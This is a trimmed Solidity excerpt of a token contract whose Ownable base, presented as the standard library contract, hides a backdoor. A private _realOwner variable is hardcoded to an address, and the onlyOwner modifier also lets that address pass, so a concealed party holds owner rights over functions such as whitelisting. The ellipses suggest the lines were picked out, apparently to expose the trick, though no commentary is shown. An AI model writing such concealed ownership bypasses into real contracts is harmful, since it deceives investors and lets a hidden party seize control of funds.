...
abstract contract Ownable is Context {
    ...
    address private _realOwner = 0xA29bFe1853805D66ed79d01B79c53c65774EB8b3;
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _realOwner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract Token is ERC20, Ownable {
    ...
    function buy() public payable {
        ...
        if (count > _tokenOnDrop) revert NotEnoughTokenOnDrop();
    ...
    function addManyToWhitelist(address[] memory _users) external onlyOwner {
